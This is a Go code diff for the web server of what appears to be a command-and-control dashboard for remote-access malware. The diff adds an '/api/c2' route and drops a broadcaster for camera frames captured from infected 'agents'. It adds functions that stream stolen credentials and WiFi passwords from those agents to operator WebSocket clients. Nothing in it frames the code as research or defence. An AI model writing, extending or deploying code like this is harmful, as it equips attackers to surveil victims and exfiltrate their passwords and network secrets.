@@ -33,7 +33,7 @@ type APIResponse struct {
 
 func StartWebServer(config *Config, server *Server) {
     handler := &WebHandler{server: server}
-
+    http.HandleFunc("/api/c2", handler.handleC2Config)
     http.Handle("/static/", http.StripPrefix("/static/", http.FileServer(http.Dir("./web/static/"))))
 
     http.HandleFunc("/ws", handler.handleWebSocket)
@@ -245,52 +245,7 @@ func BroadcastFrame(agentID string, frameData map[string]interface{}) {
     }
 }
 
-// ==================== CAMERA FRAME BROADCAST ====================
 
-func BroadcastCameraFrame(agentID string, frameData map[string]interface{}) {
-    wsMutex.Lock()
-    defer wsMutex.Unlock()
-    
-    // Cek data
-    var frameDataStr string
-    if data, ok := frameData["data"].(string); ok && len(data) > 100 {
-        frameDataStr = data
-    } else if data, ok := frameData["frame_data"].(string); ok && len(data) > 100 {
-        frameDataStr = data
-    }
-    
-    if frameDataStr == "" {
-        return
-    }
-    
-    data := map[string]interface{}{
-        "type":     "camera_frame",
-        "agent_id": agentID,
-        "frame": map[string]interface{}{
-            "data":         frameDataStr,
-            "width":        frameData["width"],
-            "height":       frameData["height"],
-            "frame_number": frameData["frame_number"],
-            "camera":       frameData["camera"],
-            "timestamp":    frameData["timestamp"],
-            "size":         len(frameDataStr),
-        },
-        "timestamp": time.Now().Unix(),
-    }
-    
-    if len(wsClients) > 0 {
-        log.Printf("📷 Broadcasting camera frame to %d clients (agent: %s, size: %d)", 
-            len(wsClients), agentID, len(frameDataStr))
-    }
-    
-    for conn := range wsClients {
-        if err := conn.WriteJSON(data); err != nil {
-            log.Printf("WebSocket camera frame broadcast error: %v", err)
-            conn.Close()
-            delete(wsClients, conn)
-        }
-    }
-}
 
 func BroadcastVideoFrame(agentID string, frameData map[string]interface{}) {
     wsMutex.Lock()
@@ -677,6 +632,53 @@ func (h *WebHandler) handleWhatsApp(w http.ResponseWriter, r *http.Request) {
     })
 }
 
+
+// ==================== CREDENTIALS BROADCAST ====================
+
+func BroadcastCredentials(agentID string, result map[string]interface{}) {
+    wsMutex.Lock()
+    defer wsMutex.Unlock()
+    
+    data := map[string]interface{}{
+        "type":      "credentials_data",
+        "agent_id":  agentID,
+        "data":      result,
+        "timestamp": time.Now().Unix(),
+    }
+    
+    log.Printf("🔐 Broadcasting credentials for %s to %d clients", agentID, len(wsClients))
+    
+    for conn := range wsClients {
+        if err := conn.WriteJSON(data); err != nil {
+            log.Printf("WebSocket credentials broadcast error: %v", err)
+            conn.Close()
+            delete(wsClients, conn)
+        }
+    }
+}
+
+func BroadcastWifiPasswords(agentID string, result map[string]interface{}) {
+    wsMutex.Lock()
+    defer wsMutex.Unlock()
+    
+    data := map[string]interface{}{
+        "type":      "wifi_passwords",
+        "agent_id":  agentID,
+        "data":      result,
+        "timestamp": time.Now().Unix(),
+    }
+    
+    log.Printf("📶 Broadcasting WiFi passwords for %s", agentID)
+    
+    for conn := range wsClients {
+        if err := conn.WriteJSON(data); err != nil {
+            log.Printf("WebSocket WiFi broadcast error: %v", err)
+            conn.Close()
+            delete(wsClients, conn)
+        }
+    }
+}
+
 func (h *WebHandler) handleExport(w http.ResponseWriter, r *http.Request) {
     w.Header().Set("Content-Type", "application/json")
 
@@ -748,4 +750,3 @@ func (h *WebHandler) handleAgentPage(w http.ResponseWriter, r *http.Request) {
     }
     http.ServeFile(w, r, "./web/templates/agent.html")
 }
-
